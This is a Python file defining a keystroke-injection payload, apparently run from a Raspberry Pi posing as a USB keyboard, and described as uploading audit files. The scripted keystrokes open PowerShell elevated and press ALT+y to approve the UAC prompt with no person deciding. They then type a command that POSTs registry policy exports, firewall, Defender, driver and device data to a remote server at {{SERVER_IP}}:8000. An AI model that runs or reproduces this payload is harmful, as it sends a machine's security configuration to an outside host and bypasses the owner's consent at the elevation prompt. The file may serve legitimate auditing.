"""
Upload payload - sends audit files to Raspberry Pi upload server
"""

UPLOAD_PAYLOAD = {
    'name': 'Upload Audit Files',
    'description': 'Uploads all audit files to Pi server',
    'commands': [
        {'action': 'combo', 'keys': ['WIN', 'r']},
        {'action': 'delay', 'ms': 500},
        {'action': 'type', 'text': 'powershell'},
        {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
        {'action': 'delay', 'ms': 1500},
        {'action': 'combo', 'keys': ['ALT', 'y']},
        {'action': 'delay', 'ms': 1000},
        {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
        {'action': 'type', 'text': 'foreach($f in $files){if(Test-Path "C:\\$f"){'},
        {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile "C:\\$f" -Headers @{"X-Filename"=$f}'},
        {'action': 'type', 'text': '}}'},
        {'action': 'key', 'name': 'ENTER'},
        {'action': 'delay', 'ms': 5000},
        {'action': 'type', 'text': 'exit'},
        {'action': 'key', 'name': 'ENTER'},
    ]
}
